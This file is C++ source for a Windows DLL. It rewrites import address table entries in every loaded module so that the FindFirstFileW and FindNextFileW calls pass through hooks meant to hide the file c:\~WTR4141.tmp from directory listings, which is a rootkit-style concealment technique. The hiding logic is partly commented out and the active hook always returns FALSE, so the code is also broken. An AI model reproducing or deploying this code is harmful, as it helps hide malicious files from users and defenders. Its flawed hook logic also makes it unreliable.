#include<Windows.h>
#include <TlHelp32.h>
#include<DbgHelp.h>
#include<string>

#pragma comment(lib,"imagehlp.lib")

#define HIDEFILE L"c:\\~WTR4141.tmp"

typedef HANDLE(WINAPI* PFNFindFirstFile)(LPCTSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData);
typedef BOOL(WINAPI* PFNFindNextFile)(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData);

DWORD* MyFindFirstFileWAddr, * FindFirstFileWAddr;
DWORD* MyFindNextFileWAddr, * FindNextFileWAddr;


//标记是否和隐藏的文件目录匹配
bool bPathMatch = false;
HANDLE WINAPI MyFindFirstFileW(LPCTSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData)
{
	//HANDLE hFind = 0;
	//std::wstring HidePath;
	//HidePath.append(HIDEFILE);
	//int pos = HidePath.rfind(L"\\", HidePath.length());
	//HidePath = HidePath.substr(0, pos);
	//OutputDebugString(HidePath.c_str());
	//if (_wcsnicmp((wchar_t*)lpFileName, HidePath.c_str(), HidePath.length()) == 0)
	//{
	//	OutputDebugString(lpFileName);
	//	OutputDebugString(HidePath.c_str());
	//	bPathMatch = true;
	//}
	//else
	//{
	//	bPathMatch = false;
	//}

	return ((PFNFindFirstFile)FindFirstFileWAddr)(lpFileName, lpFindFileData);
}

BOOL WINAPI MyFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData)
{
	BOOL bReturn = FALSE;
	//static wchar_t HideName[MAX_PATH + 1] = { 0 };
	//int i, j;
	//bReturn = ((PFNFindNextFile)FindNextFileWAddr)(hFindFile, lpFindFileData);
	//if (bPathMatch)
	//{
	//	//是目标文件的目录
	//	if (wcslen(HideName) == 0)
	//	{
	//		wcscpy(HideName, HIDEFILE);
	//		HideName[i] = '\0';
	//		while (HideName[i] != '\\' && i > 0)
	//			i--;
	//		i++;
	//		j = 0;
	//		while (HideName[i] != '\0' && _wcsnicmp(lpFindFileData->cFileName, HideName, wcslen(HideName)) == 0)
	//		{
	//			bReturn = ((PFNFindNextFile)FindNextFileWAddr)(hFindFile, lpFindFileData);
	//			if (bReturn == false)
	//				break;
	//		}
	//	}
	//}
	return bReturn;
}

void IATFind(DWORD* FromAddr, DWORD* ToAddr, const wchar_t* module)
{
	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor;
	PIMAGE_THUNK_DATA		pThunkData;
	ULONG uSize;
	DWORD* Addr2;
	DWORD dwOLD;
	MEMORY_BASIC_INFORMATION mbi;
	HMODULE hMod = GetModuleHandleW(module);
	pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToData(hMod,true, IMAGE_DIRECTORY_ENTRY_IMPORT, &uSize);
	if (!pImportDescriptor)
		return;
	while (pImportDescriptor->Name)
	{
		char* szModName = (char*)((PBYTE)hMod + pImportDescriptor->Name);
		if (_wcsicmp(module, L"~WTR4141.tmp") == 0) break;
		//if (_wcsicmp(module, L"ADVAPI32.DLL") != 0) break;
		if (_stricmp(szModName, "kernel32.dll") == 0)
		{
			pThunkData = (PIMAGE_THUNK_DATA32)((PBYTE)hMod + pImportDescriptor->FirstThunk);
			while (pThunkData->u1.Function)
			{
				Addr2 = (DWORD*)pThunkData->u1.Function;
				if ((DWORD)Addr2 == (DWORD)FromAddr)
				{
					OutputDebugString(module);
					OutputDebugString(L"start api hook");
					VirtualQuery(&(pThunkData->u1.Function), &mbi, sizeof(mbi));
					VirtualProtect(&(pThunkData->u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOLD);
					WriteProcessMemory(GetCurrentProcess(), &(pThunkData->u1.Function), &ToAddr, sizeof(DWORD), NULL);
					VirtualProtect(&(pThunkData->u1.Function), sizeof(DWORD), dwOLD, 0);
					break;
				}
				pThunkData++;
			}
		}
		pImportDescriptor++;
	}
}

bool DLLFind()
{
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE| TH32CS_SNAPMODULE32, GetCurrentProcessId());
	if (hSnap == INVALID_HANDLE_VALUE)
	{
		OutputDebugString(L"CreateToolhelp32Snapshot() failed ");
		return false;
	}
	MODULEENTRY32 me;
	me.dwSize = sizeof(me);
	Module32First(hSnap, &me);
	do
	{
		IATFind(FindFirstFileWAddr, MyFindFirstFileWAddr, me.szModule);
		//IATFind(FindNextFileWAddr, MyFindNextFileWAddr, me.szModule);
	} while (Module32Next(hSnap, &me));
	CloseHandle(hSnap);
}

DWORD WINAPI APIHOOK(LPVOID lpParameter)
{
	OutputDebugString(L"begin apihook thread!");
	HMODULE h;
	h = GetModuleHandle(L"kernel32.dll");
	if (h == NULL)
	{
		OutputDebugString(L"get kernel32 module failed!");
		return 0;
	}
	MyFindFirstFileWAddr = (DWORD*)MyFindFirstFileW;
	FindFirstFileWAddr = (DWORD*)GetProcAddress(h, "FindFirstFileW");
	MyFindNextFileWAddr = (DWORD*)MyFindNextFileW;
	FindNextFileWAddr = (DWORD*)GetProcAddress(h, "FindNextFileW");
	DLLFind();
	return 0;
}